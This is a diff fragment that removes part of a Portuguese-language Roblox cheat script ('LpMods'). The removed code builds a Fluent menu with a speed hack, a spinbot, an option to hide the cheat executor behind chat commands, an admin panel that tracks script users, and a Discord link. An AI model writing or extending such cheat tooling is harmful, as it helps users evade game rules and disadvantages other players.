-    Settings.EnableSpeed = v; ApplySpeed()
-end })
-
-Tabs.Movement:AddSlider("Speed", {
-    Title = "Aumentar Velocidade", Min = 16, Max = 300, Default = 16, Rounding = 0,
-    Callback = function(v) Settings.Speed = v; ApplySpeed() end
-})
-
-Tabs.Movement:AddToggle("Spinbot", { Title = "Spinbot", Default = false, Callback = function(v) Settings.Spinbot = v end })
-
-Tabs.Misc:AddToggle("EsconderExecutor", {
-    Title = "Esconder Executor", Default = false,
-    Callback = function(v)
-        executorEscondido = v
-        definirVisibilidadeExecutor(not v)
-        Fluent:Notify({
-            Title = "Executor",
-            Content = v and "Escondido. Digite .hub pra voltar." or "Visivel.",
-            Duration = 4
-        })
-    end
-})
-
-Tabs.Misc:AddButton({
-    Title = "Alternar Executor", Description = ".hub / .hide no chat",
-    Callback = function() AlternarExecutor() end
-})
-
-if isAdmin and Tabs.Admin then
-    Tabs.Admin:AddButton({
-        Title = "Abrir Painel Admin",
-        Description = "Lista so quem usa o script",
-        Callback = function() abrirPainelAdmin() end
-    })
-    Tabs.Admin:AddButton({
-        Title = "Forcar Heartbeat",
-        Description = "Publica presenca agora (espera 15s pra propagar)",
-        Callback = function()
-            pcall(publishHeartbeat)
-            Fluent:Notify({ Title = "Admin", Content = "Heartbeat enviado. Espera 15s.", Duration = 4 })
-        end
-    })
-end
-
-Tabs.Discord:AddButton({
-    Title = "Copiar Link do Discord",
-    Description = "https://discord.gg/zSQPNz8",
-    Callback = function()
-        setclipboard("https://discord.gg/zSQPNz8")
-        Fluent:Notify({ Title = "LpMods", Content = "Link do Discord copiado!", Duration = 4 })
-    end
-})
-
-task.spawn(function()
-    task.wait(1)
-    for _, gui in pairs(game.CoreGui:GetChildren()) do
-        if gui:IsA("ScreenGui") and gui.Name:find("Fluent") then
-            for _, v in pairs(gui:GetDescendants()) do
-                if v:IsA("Frame") and (v.Name:find("Slider") or v.Name:find("Bar")) then
-                    v.Active = true
-                end
-            end
-        end
-    end
-end)
-
-Window:SelectTab(1)
+     
